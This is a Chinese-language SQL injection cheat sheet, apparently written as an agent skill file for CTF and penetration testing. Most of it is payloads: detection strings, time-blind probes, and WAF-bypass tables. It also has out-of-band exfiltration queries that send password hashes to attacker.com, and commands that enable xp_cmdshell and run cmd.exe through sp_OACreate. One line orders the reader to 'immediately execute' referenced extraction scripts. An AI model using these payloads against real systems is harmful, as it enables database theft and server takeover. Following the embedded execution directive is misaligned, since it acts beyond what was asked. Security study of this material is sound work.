...
>
> 本文件自包含：UNION/报错深度（REF: union-and-error）、盲注自动化（REF: blind-injection）、二次/堆叠/SQLite/INTO OUTFILE（REF: advanced-injection）、MSSQL/Oracle/PostgreSQL/Access 特定技术（REF: db-specific-injection）、WAF 绕过与 sqlmap（REF: waf-bypass-sqlmap）全部内联，无需外部子文件。
...
**强制动作**: 
1. ⛔ **立即执行** 下文对应 REF 章节 获取 Python 自动提取脚本
...
> 融合自 yaklang/hack-skills `sqli-sql-injection`，与上文方法论去重后仅保留独有内容。MySQL CTF 流程见上文 Phase 0-4；四大库深度技术见 REF: db-specific-injection；盲注自动化脚本见 REF: blind-injection；WAF/sqlmap 见 REF: waf-bypass-sqlmap。配套场景与 tamper 链：[sql-injection-scenarios.md](./sql-injection-scenarios.md)、[sql-injection-sqlmap-advanced.md](./sql-injection-sqlmap-advanced.md)。

## 快速起步 — 首轮 payload 家族

| 场景 | 起手 | 原因 |
|---|---|---|
| 登录 / 布尔分支 | `' or 1=1--` | 认证/条件逻辑最快信号 |
| 数字型参数 | `1 or 1=1` | 不依赖引号闭合 |
| ORDER BY / 排序 | `1,2,3` 再 `1 desc--` | 结构探测 |
| 有可见报错 | `'` 后按库发探测 payload | 报错文本直接给出库类型 |
| 无回显 | 时间盲注 payload | 盲注稳定兜底 |
| 重过滤 / WAF | polyglot / 无空白变体 | 扩大解析器混淆面 |
...
| `ORA-` 前缀 | Oracle | 转带外（OOB）或 XML 特性 |
| SQLite 报错、本地应用 | SQLite | 布尔/UNION + 文件行为 |
...
|---|---|
| `'` 与 `''` 响应不同 | 字符串上下文注入点 |
| `1` vs `1-1` vs `2-1` 返回相同 | 算术被执行 |
| 条件里 `1=1` 与 `1=2` 改变结果 | 布尔注入 |
| ORDER BY N 枚举成功 | UNION 前置 |
| `'; WAITFOR DELAY '0:0:5'--` 延迟 | 时间盲注 |
| `'` 500、`''` 200 | 未处理异常 = SQLi |
| 响应长度差异 | 布尔盲注指标 |

**必须在所有参数类型里测**：URL query、POST body、JSON 字段、XML 值、HTTP 头（X-Forwarded-For / User-Agent / Referer / Cookie）。
...
VERSION()                  -- 版本串
@@datadir                  -- 数据目录
@@global.secure_file_priv  -- 文件读写限制

-- MSSQL
@@VERSION                  -- 含 "Microsoft SQL Server"
DB_NAME()                  -- 当前库
USER_NAME()                -- 当前用户

-- Oracle
SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name          -- 当前库
user                       -- 当前用户
...
列数二分见上文 Phase 1 / REF: union-and-error。列类型用 NULL 最稳：

```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--   ← 定位字符串列
```
...
## 盲注 payload 速查（自动化脚本见上文 REF: blind-injection）
...
四大库 OOB 深度（xp_dirtree / UTL_HTTP 云元数据 / UTL_TCP / DBMS_LDAP / PG 带外）见上文 REF: db-specific-injection。此处仅补独有变体：

```sql
-- MSSQL OpenRowSet 回传（需 SQLOLEDB，出站 TCP；用 80/443 绕出站限制）
'; INSERT INTO OPENROWSET('SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass','SELECT * FROM foo')
  SELECT TOP 1 username+':'+password FROM users--

-- Oracle UTL_INADDR DNS 外带（常绕过 HTTP 限制）
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
-- UTL_HTTP 支持代理 —— 可借企业代理出网

-- MySQL LOAD_FILE UNC（Windows + 出站 SMB 触发 DNS）
SELECT LOAD_FILE('\\\\attacker.com\\share')
```

INTO OUTFILE 写 Webshell 见上文 REF: advanced-injection（条件：FILE 权限、可写 web 根、`secure_file_priv=''`）。

## 提权到 OS

```sql
-- MSSQL xp_cmdshell 启用（需 sysadmin；用法见 REF db-specific-injection 1.1）
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- MySQL UDF：写恶意 so 到文件系统后 CREATE FUNCTION ... SONAME
...
利用流程与 sqlmap `--second-url` 用法见上文 REF: advanced-injection。核心判断依据：**任何「读出存储数据 → 拼进新查询」的函数都是二次注入候选** —— 改密码、改资料、管理员操作用户数据重点排查。

## 参数化查询绕过场景

参数化查询在以下情况**不**防注入：

1. **表/列名用户可控** — 参数化占不了标识符：
   ```sql
   "SELECT * FROM " + tableName + " WHERE id = ?"   -- 仍不安全
   ```
   缓解：白名单校验表/列名。
2. **半参数化** — 部分字段仍拼接：
   ```sql
   ...
   ```
3. **IN 子句动态数量**（ORM 常见错误）：
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)   -- 只有最后一个被参数化
   ```
4. **二次注入** — 从库里读出的数据被当成干净数据再次进查询。
...
SELECT username,password FROM dba_users   -- 需 DBA
...
`information_schema` 被过滤时 MySQL 替代：`mysql.innodb_table_stats`、`sys.schema_table_statistics`（另见上文「innodb_table_stats 替代」节）。

## 存储过程滥用

```sql
-- MSSQL sp_OAMethod（COM 自动化）
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'

-- Oracle DBMS_LDAP（出站 LDAP = DNS 外带，另见上文 2.5）
...
' OR 'a'='a                -- 认证绕过变体
'; SELECT 1--              -- 语句终止
' UNION SELECT NULL--      -- UNION 探测
' AND 1=1-- / ' AND 1=2--  -- 布尔真假对比（响应不同 = 可注入）
1; WAITFOR DELAY '0:0:3'-- -- MSSQL 延迟
1 AND SLEEP(3)--           -- MySQL 延迟
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle 延迟
```
...
| 被过滤 | 绕过 |
|---|---|
| 空格 | `SELECT/**/…/**/FROM`、`SELECT%0a*%0aFROM`、`SELECT(username)FROM(users)`、非标准空白 `%C2%85`（另见上文 1.7） |
| 逗号 | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c`；`SUBSTRING('abc' FROM 1 FOR 1)`；`LIMIT 1 OFFSET 0` |
| 引号 | `0x61646D696E`（hex）、`CHAR(97,100,109,105,110)` |
| OR/AND | `||1=1`、`&&1=1`、`DIV 0` |
| = | `id LIKE 1`、`id REGEXP '^1$'`、`id IN (1)`、`id BETWEEN 1 AND 1` |
| SELECT | MySQL `handler`、`PREPARE`+hex、堆叠查询 |
| information_schema | `mysql.innodb_table_stats`、`sys.schema_table_statistics` |

其他模式：

- Polyglot：`SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- 路由注入：`1' UNION SELECT 0x<inner_payload_hex>-- -`（内层完整查询 hex 编码）
- PDO 仿真预编译：`PDO::ATTR_EMULATE_PREPARES=true` 时堆叠查询仍然可用
- 引号入口 Unicode 变体：`U+02BA ʺ → "`、`U+02B9 ʹ → '`、`%%2727 → %27 → '`
- 大量数据提取用 `--threads` 控速；优先低风险技术（布尔 > 时间 > 报错），避免 `--risk 3`（OR 类 payload 可能改数据）
